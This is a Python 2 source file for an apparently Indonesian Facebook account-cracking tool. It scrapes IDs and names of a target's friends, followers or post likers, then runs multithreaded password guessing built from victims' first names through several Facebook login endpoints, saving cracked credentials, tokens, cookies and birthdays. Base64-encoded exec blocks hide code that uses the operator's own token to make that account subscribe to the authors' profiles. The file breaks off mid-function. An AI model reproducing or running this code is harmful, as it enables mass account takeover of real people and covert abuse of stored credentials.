#!/usr/bin/python2
# coding=utf-8
# coding by Romi Afrizal
# Note : jangan di ubah lagi! nanti error, script udah enak
# Open source code team | ngotak dikit cok jangan jual di perjual belikan 

Hj = '\x1b[1;92m' 
Mt = '\x1b[0m' 
ingfo = (
"""%s
 • Info script :
 	
 - author      : Romi Afrizal
 - facebook    : facebook.com/romi.afrizal.102
 - fanspage    : facebook.com/100022086172556
 - whatsap     : +6282371648186
 - github      : github.com/Mark-Zuck
 - script name : bff-2
 - version     : 1.1
 
%s"""%(Hj,Mt))

import os
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import concurrent.futures
except ImportError:
    os.system('pip2 install futures')
try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')
    
import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64
from concurrent.futures import ThreadPoolExecutor 
from bs4 import BeautifulSoup as parser
from time import sleep as jeda
from datetime import datetime
exec(base64.b64decode('Y3QgPSBkYXRldGltZS5ub3coKQ0KbiA9IGN0Lm1vbnRoDQpidWxhbjEgPSB7IjAxIjogIkphbnVhcmkiLCAiMDIiOiAiRmVicnVhcmkiLCAiMDMiOiAiTWFyZXQiLCAiMDQiOiAiQXByaWwiLCAiMDUiOiAiTWVpIiwgIjA2IjogIkp1bmkiLCAiMDciOiAiSnVsaSIsICIwOCI6ICJBZ3VzdHVzIiwgIjA5IjogIlNlcHRlbWJlciIsICIxMCI6ICJPa3RvYmVyIiwgIjExIjogIk5vdmVtYmVyIiwgIjEyIjogIkRlc2VtYmVyIn0NCmJ1bGFuID0gWydKYW51YXJpJywgJ0ZlYnJ1YXJpJywgJ01hcmV0JywgJ0FwcmlsJywgJ01laScsICdKdW5pJywgJ0p1bGknLCAnQWd1c3R1cycsICdTZXB0ZW1iZXInLCAnT2t0b2JlcicsICdOb3ZlbWJlcicsICdEZXNlbWJlciddDQp0cnk6DQogICAgaWYgbiA8IDAgb3IgbiA+IDEyOg0KICAgICAgICBleGl0KCkNCiAgICBuVGVtcCA9IG4gLSAxDQpleGNlcHQgVmFsdWVFcnJvcjoNCiAgICBleGl0KCkNCg0KY3VycmVudCA9IGRhdGV0aW1lLm5vdygpDQp0YSA9IGN1cnJlbnQueWVhcg0KYnUgPSBjdXJyZW50Lm1vbnRoDQpoYSA9IGN1cnJlbnQuZGF5DQpvcCA9IGJ1bGFuW25UZW1wXQ0KcmVsb2FkKHN5cykNCnN5cy5zZXRkZWZhdWx0ZW5jb2RpbmcoJ3V0Zi04JykNCiMgS1VNUFVMQU4gV0FSTkENCk0gPSAnXHgxYlsxOzkxbScgIyBNRVJBSA0KSCA9ICdceDFiWzE7OTJtJyAjIEhJSkFVDQpLID0gJ1x4MWJbMTs5M20nICMgS1VOSU5HDQpCID0gJ1x4MWJbMTs5NG0nICMgQklSVQ0KVSA9ICdceDFiWzE7OTVtJyAjIFVOR1UNCk8gPSAnXHgxYlsxOzk2bScgIyBCSVJVIE1VREENClAgPSAnXHgxYlsxOzk3bScgIyBQVVRJSA0KTiA9ICdceDFiWzBtJyAjIFdBUk5BIE1BVEkNCmFjYWsgPSBbTSwgSCwgSywgQiwgVSwgTywgUF0NCndhcm5hID0gcmFuZG9tLmNob2ljZShhY2FrKQ0KdGlsID0i4oCiIg=='))

ok = []
cp = []
id = []
user = []
loop = 0

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush();jeda(0.03)

def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print ('\r%s%s menghapus token %s'%(M,til,o)),
        sys.stdout.flush();jeda(1)
        
def folder():
	try:os.mkdir('data')
	except:pass
	try:
		ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
		open("data/ua.txt","w").write(ua_)
	except:
		pass
        
# LOGO (LO GOBLOK)
IP = requests.get('https://api.ipify.org').text
def banner():
	print ( """
\033[1;37m    d8888b. d888888b .d8888. db   db db    db 
\033[1;37m    88  `8D   `88'   88'  YP 88   88 88    88 
\033[1;32m    88oobY'    88    `8bo.   88ooo88 88    88 
\033[1;32m    88`8b      88      `Y8b. 88~~~88 88    88 
\033[1;37m    88 `88.   .88.   db   8D 88   88 88b  d88 
\033[1;37m    88   YD Y888888P `8888Y' YP   YP ~Y8888P' 
\033[1;97m-------------------------------------------------
\033[1;97m  ➤ Author  : Rishu Khan (\x1b[1;32mAL3X\x1b[1;37m) 
\033[1;97m  ➤ Github  : https://github.com/Alon3-Rishu
\033[1;97m  ➤ Fb ID   : https://facebook.com/al3x.rishu
\033[1;97m-------------------------------------------------
\033[1;97m         [\033[1;97m\033[1;41mIF YOU DREAM IT CAN YOU DO IT\033[0m\x1b[1;37m]
\033[1;97m-------------------------------------------------""")

# ENTER TOKEN (ELECTRICITY TOKEN)
header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
def masuk():
    os.system('clear');banner()
    print("\033[1;97m-------------------------------------------------")
    print ('\n%s [01] Login With Token \n [02] How to get tokens \n [%s00%s] Tool logout'%(P,M,P))
    print("\033[1;97m-------------------------------------------------")
    rom = raw_input('\n%s [?] Menu : %s'%(P,K))
    if rom in(""):
    	print("%s [!] Correct contents  "%(M));exit()
    elif rom in ('1','01'):
        os.system('clear');banner()
        jalan("\n%s [%s!%s] Wajib gunakan akun tumbal dilarang akun utama"%(P,M,P))
        print("\033[1;97m-------------------------------------------------")
    	romz = raw_input('%s [?] Token ➤ %s'%(P,K))
        print("\033[1;97m-------------------------------------------------")
        if romz in(""):
        	print("\x1b[1;31m [!] Correct contents  "%(M));exit()
    	try:
            gas = requests.get('https://graph.facebook.com/me?access_token=%s'%(romz)).json()['name']
            print ('\n%s[√] Login successful, please wait '%(H));jeda(2)
            open('token.txt', 'w').write(romz);login_xx()
            exec(base64.b64decode('b3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMicpO21lbnUoKQ=='))
        except (KeyError,IOError):
        	print("%s [!] Token invalid "%(M));masuk()
    elif rom in ('2', '02'):
    	os.system("xdg-open https://facebook.com/al3x.rishu")
        nanya = raw_input('%s [?] Back? [%sy%s/%sn%s] :%s '%(P,H,P,M,P,K))
        if nanya in(""):
        	print ("%s [!] saya bertanya wajib di jawab "%(M));jeda(2);masuk()
        elif nanya in("y","Y"):
        	print ("\n%s [√] selamat anda pintar :* "%(H));jeda(2);masuk()
        elif nanya in("n","N"):
        	print ("\n%s [!] anda sungguh tolol "%(M));jeda(2);os.system("xdg-open https://youtu.be/IG5QfdxRkeY");masuk()
    elif rom in ('0', '00'):
    	exit('\n')
    else:
    	print("%s [!] Isi yang benar kentod "%(M));exit()

# MENU INI AJG
def menu():
    os.system('clear')
    try:
    	romz = open('token.txt', 'r').read()
    except IOError:
        print ("%s [!] Token invalid "%(M));jeda(2);os.system('rm -rf token.txt');masuk()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+romz,headers=header)
        a = json.loads(r.text)
        nama = a["name"]
    except KeyError:
        print("%s [!] Token invalid "%(M));jeda(2);os.system('rm -rf data/token.txt && rm -rf data/cookies');masuk()
    except requests.exceptions.ConnectionError:
        exit("%s [!] Kesalahan koneksi "%(M))
    banner()
    print ('            %s[ welcome %s%s%s ] '%(P,K,nama,P))
    print("\033[1;97m-------------------------------------------------")
    print (' [%s01%s] Dump id public'%(K,P)) 
    print (' [%s02%s] Dump id followers'%(K,P)) 
    print (' [%s03%s] Dump id reaction post'%(K,P)) 
    print (' [%s04%s] %sStart crack %s'%(K,P,H,P)) 
    print (' [%s05%s] Change user agent'%(K,P)) 
    print (' [%s06%s] Check the crack results'%(K,P)) 
    #print (' [%s07%s] Gabung group'%(K,P))
    #print (' [%s08%s] Info script'%(K,P))
    print (' [%s00%s] Exit (remove token)'%(M,P))
    print("\033[1;97m-------------------------------------------------")
    unik = raw_input('\n%s [?] Menu : %s'%(P,K))
    if unik == '':
        print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
    elif unik in['1','01']:
        publik(romz)
    elif unik in['2','02']:
        followers(romz)
    elif unik in['3','03']:
        postingan(romz)
    elif unik in['4','04']:
    	os.system('clear');banner()
        ngentod().romiy()
        banner()
    elif unik in['5','05']:
    	useragent()
    elif unik in['6','06']:
    	try:
            dirs = os.listdir("hasil")
            print
            for file in dirs:
                print("%s -> %s%s"%(K,P,file));jeda(0.2)
            print("\n %s[%s!%s] cth : CP-%s-%s-%s%s"%(P,M,P,ha,op,ta,".txt"))
            file = raw_input("%s [?] masukan file : "%(P));jeda(0.2)
            if file == "":
                print("%s [!] file tidak ada "%(M))
            total = open("hasil/%s"%(file)).read().splitlines()
            print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
            nm_file = ("%s"%(file)).replace("-", " ")
            jalan(" [%s*%s] total akun : %s"%(K,P,len(total)))
            print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
            for akun in total:
            	fb = akun.replace("\n","")
                tling  = fb.replace(" *--> ", " *-->").replace(" *-->", " *--> ")
                print(tling);jeda(0.03)
            print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
            raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
        except (IOError):
            print("\n%s [!] tidak ada hasil "%(M))
            raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
    elif unik in['7','07']:
        os.system("xdg-open https://www.facebook.com/groups/924679595149360")
    elif unik in['8','08']:
        print(ingfo)
    elif unik in['0','00']:
        print ('')
        tik();jeda(1);os.system('rm -rf token.txt')
        jalan('\n%s [√] berhasil terhapus '%(H));exit()
    else:
        print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
 
exec(base64.b64decode('ZGVmIGxvZ2luX3h4KCk6CiAgICB0cnk6CiAgICAgICAgdG9rZW4gPSBvcGVuKCJkYXRhL3Rva2VuLnR4dCIsInIiKS5yZWFkKCkgCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDIyMDg2MTcyNTU2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBGYW5zcGFnZSBSb21pIFhECiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI4NDM0ODgwNTI5L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNjc4MDc1NjU4NjEvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIFJvbWkgQWZyaXphbCAoMjAyMSkKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDM3MjM2OTY4ODUvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIElxYmFsIGJvYnoKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNDExMjkwNDg5NDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEl3YW4gaGFkaWFuc3lhaAogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwNzUyMDIwMzQ1Mi9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgSGFtemFoIGtpcmFuYQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwMjQ2MTM0NDE3OC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVW5payBST01JIEFGUklaQUwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNzE3NDc0MjA1ODMvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIERvbmlmdGZhbm55CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI5MTQzMTExNTY3L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBEZW1pdCBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDE1NDAyOTkxMDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEhha2lraQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDA1NTkxODM5MTI4MC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVGlhcmEgYXJ0CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDA5Mzg0MzM4NDcwL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBJd2FuIGhhbmRpYW5zeWFoIHYyCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDM2NjU1MzI1OTk2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBBYnVzdG8gSmF2YQogICAgZXhjZXB0OgogICAgCXBhc3M='))

def publik(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	os.system('clear');banner()
    	print ("\n%s [%s!%s] Ketik '%sme%s' jika ingin dump daftar teman sendiri "%(P,M,P,H,P))
        idt = raw_input(' [*] Target id : %s'%(K))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.IDS').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,romz))
        z = json.loads(r.text)
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s [*] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)

        bff.close()
        print("\033[1;97m-------------------------------------------------")
        print (' %s[%s√%s] Succes dump id dari %s%s'%(P,H,P,H,nm['name']))
        print (' %s [%s√%s] File dump tersimpan :%s %s '%(P,H,P,H,file))
        print("\n\033[1;97m-------------------------------------------------")
        raw_input('\n%s [ %senter %s] '%(P,K,P))
        menu()
    except Exception as e:
        exit('\n %s[!] gagal dump id'%(P))

# DUMP FOLLOWERS
def followers(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	os.system('clear');banner()
    	print ("\n%s [%s!%s] Ketik '%sme%s' jika ingin dump followers sendiri "%(P,M,P,H,P))
        idt = raw_input(' [*] Target id : %s'%(K))
        batas = raw_input(' %s[*] Maximal id : %s'%(P,K))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.IDS').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(idt,batas,romz))
        z = json.loads(r.text)
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s [*] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)

        bff.close()
        print("\033[1;97m-------------------------------------------------")
        print ('\n\n %s[%s√%s] Succes dump id dari %s%s'%(P,H,P,H,nm['name']))
        print (' %s[%s√%s] File dump tersimpan :%s %s '%(P,H,P,H,file))
        print("\033[1;97m-------------------------------------------------")
        raw_input('\n%s [ %senter %s] '%(P,K,P))
        menu()
    except Exception as e:
        exit('\n %s[!] gagal dump id'%(P))
  
# DUMP POSTINGAN 
def postingan(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	os.system('clear');banner()
    	print ("\n%s [%s!%s] Perlu di ingat postingan wajib publik "%(P,M,P))
        idt = raw_input(' [*] Id post   : %s'%(K))
        simpan = raw_input(' %s[?] Nama file : %s'%(P,K))
        r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s'%(idt,romz))
        id = []
        z = json.loads(r.text)
        file = ('dump/' + simpan + '.IDS').replace(' ', '_')
        bff = open(file, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s [*] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)

        bff.close()
        print("\033[1;97m-------------------------------------------------")
        print ('\n\n %s[%s√%s] Succes dump id postingan '%(P,H,P))
        print ('%s [%s√%s] File dump tersimpan :%s %s '%(P,H,P,H,file))
        print("\033[1;97m-------------------------------------------------")
        raw_input('\n%s [ %senter %s] '%(P,K,P))
        menu()
    except Exception as e:
        exit('\n %s[!] gagal dump id'%(P))


# START CRACK
class ngentod:

    def __init__(self):
        self.id = []

    def romiy(self):
        try:
            self.apk = raw_input('\n %s[?] file dump :%s '%(P,K))
            self.id = open(self.apk).read().splitlines()
            print '%s [%s*%s] jumlah id : %s%s' %(P,K,P,H,len(self.id))
            print("\033[1;97m-------------------------------------------------")
        except:
            print '\n%s [!] File dump tidak ada, dump id dulu kentod'%(M)
            raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
            print("\033[1;97m-------------------------------------------------")
        unikers = raw_input('%s [?] ingin gunakan password manual? [y/t] :%s '%(P,K))
        if unikers in ('Y', 'y'):
            print '\n %s[%s!%s] cth : %ssayang,anjing%s gunakan , (koma) untuk pemisah '%(P,M,P,H,P)
            while True:
                pwx = raw_input(' %s[?] set password :%s '%(P,K))
                if pwx == '':
                    print '\n %s[!] jangan kosong '%(M)
                elif len(pwx)<=5:
                    print '\n %s[!] password minimal 6 karakter'%(M)
                else:
                    def zona(zafi_=None): 
                    	print("\033[1;97m-------------------------------------------------")
                        ind = raw_input('\n %s[?] methode : %s'%(P,K))
                        print("\033[1;97m-------------------------------------------------")
                        if ind == '':
                            print("%s [!] Isi yang benar kentod "%(M));self.zona()
                        elif ind in ('1', '01'):
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.b_api, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif ind in ('2', '02'):
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.basic, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif ind in ('3', '03'):
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.mobil, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        else:
                            print '\n %s[!] isi yang benar kentod'%(N,M,N);self.zona()
                            print("\033[1;97m-------------------------------------------------")
                    print '\n%s [ pilih methode crack - silahkan coba satu² ]\n'%(P)
                    print ' [%s01%s] methode b-api (crack cepat)'%(K,P)
                    print ' [%s02%s] methode mbasic (crack lambat)'%(K,P)
                    print ' [%s03%s] methode mobile (crack sangat lambat)'%(K,P)
                    print("\033[1;97m-------------------------------------------------")
                    zona(pwx.split(','))
                    break
        elif unikers in ('T', 't'):
            print '\n%s [ pilih methode crack - silahkan coba satu² ]\n'%(P)
            print("\033[1;97m-------------------------------------------------")
            print ' [%s01%s] methode b-api (crack cepat)'%(K,P)
            print ' [%s02%s] methode mbasic (crack lambat)'%(K,P)
            print ' [%s03%s] methode mobile (crack sangat lambat)'%(K,P)
            print("\033[1;97m-------------------------------------------------")
            self.langsung()
        else:
            print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()

    def langsung(self):
        suuu = raw_input('\n %s[?] methode :%s '%(P,K))
        if suuu == '':
            print("%s [!] Isi yang benar kentod "%(M));self.langsung()
        elif suuu in ('1', '01'):
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"@123", _i_[0]+"123", _i_[0]+"1234", _i_[0]+"12345", _i_[0]+"123456", _i_[0]+"786"]
                        else:
                            pwx = [name, _i_[0]+"@123", _i_[0]+"123", _i_[0]+"1234", _i_[0]+"12345", _i_[0]+"123456", _i_[0]+"786"]
                        log.submit(self.b_api, uid, pwx)
                    except:
                        pass
            os.remove(self.apk);exit()
        elif suuu in ('2', '02'):
            print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"@123", _i_[0]+"123", _i_[0]+"1234", _i_[0]+"12345", _i_[0]+"123456", _i_[0]+"786"]
                        else:
                            pwx = [name, _i_[0]+"@123", _i_[0]+"123", _i_[0]+"1234", _i_[0]+"12345", _i_[0]+"123456", _i_[0]+"786"]
                        log.submit(self.basic, uid, pwx)
                    except:
                        pass
            os.remove(self.apk);exit()
        elif suuu in ('3', '03'):
            print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"@123", _i_[0]+"123", _i_[0]+"1234", _i_[0]+"12345", _i_[0]+"123456", _i_[0]+"786"]
                        else:
                            pwx = [name, _i_[0]+"@123", _i_[0]+"123", _i_[0]+"1234", _i_[0]+"12345", _i_[0]+"123456", _i_[0]+"786"]
                        log.submit(self.mobil, uid, pwx)
                    except:
                        pass
            os.remove(self.apk);exit()
        else:
            print("%s [!] Isi yang benar kentod "%(M));self.langsung()

    def b_api(self, user, zona):
        global ok,cp,loop
        print('\r %s[RISHU-OK] %s/%s OK-:%s - CP-:%s '%(P,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in zona:
            pw = pw.lower()
            try: os.mkdir('hasil')
            except: pass
            try:
            	ua = open('data/ua.txt', 'r').read()
            except (KeyError, IOError):
                ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            bapi = 'https://b-api.facebook.com/method/auth.login'
            params_ = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(bapi, params=params_, headers=headers_)
            if response.status_code != 200:
            	print ("\r\033[0;91m [!] IP terblokir. hidupkan mode pesawat 2 detik"),
                sys.stdout.flush()
                loop +=1
                b_api(self, user, zona)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r [RISHU-OK] %s|%s|%s ' % (H,user,pw,response.json()['access_token'])
                sv = ' [RISHU-OK] %s|%s|%s'% (user,pw,response.json()['access_token'])
                ok.append(sv)
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s[RISHU-CP] %s|%s|%s %s %s  ' % (K,user,pw,day,month,year)
                    sv = ' *[RISHU-CP] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(sv)
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print '\r [RISHU-CP] %s|%s           ' % (K,user,pw)
                sv = ' [RISHU-CP] %s|%s' % (user,pw)
                cp.append(sv)
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                break
                continue

        loop += 1

    def basic(self, user, zona):
        global ok,cp,loop
        print('\r [RISHU-OK] %s/%s OK-:%s - CP-:%s '%(P,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in zona:
            pw = pw.lower()
            try: os.mkdir('hasil')
            except: pass
            try:
            	ua = open('data/ua.txt', 'r').read()
            except (KeyError, IOError):
                ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s[RISHU-CP] %s|%s|%s  ' % (H,user,pw,kuki)
                sv = ' [RISHU-CP] %s|%s|%s' % (user,pw,kuki)
                ok.append(sv)
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s[RISHU-CP] %s|%s|%s %s %s ' % (K,user,pw,day,month,year)
                    sv = ' [RISHU-CP] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(sv)
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print '\r [RISHU-CP] %s|%s            ' % (K,user,pw)
                sv = ' [RISHU-CP] %s|%s' % (user,pw)
                cp.append(sv)
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                break
                continue

        loop += 1

    def mobil(self, user, zona):
        global ok,cp,loop
        print('\r %s[RISHU-OK] %s/%s OK-:%s - CP-:%s '%(P,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in zona:
            pw = pw.lower()
            try: os.mkdir('hasil')
            except: pass
            try:
            	ua = open('data/ua.txt', 'r').read()
            except (KeyError, IOError):
